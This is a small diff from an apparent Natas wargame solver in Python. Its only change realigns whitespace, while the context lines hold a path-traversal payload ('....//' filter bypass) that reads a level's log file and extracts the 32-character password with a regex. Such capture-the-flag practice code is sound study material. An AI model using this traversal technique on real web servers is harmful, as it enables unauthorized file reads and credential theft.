@@ -13,6 +13,6 @@ class Level_25(NatasLevel):
     COOKIE  = self.session.cookies.get("PHPSESSID")
     resp    = self.session.get(self.base_url + f"/index.php?lang=....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_{COOKIE}.log", headers = {'Cookie': f"PHPSESSID={COOKIE}"})
     matches = re.findall(r'[a-zA-Z0-9]{32}', resp.text)
-    match = matches[-1]
+    match   = matches[-1]
 
     return match
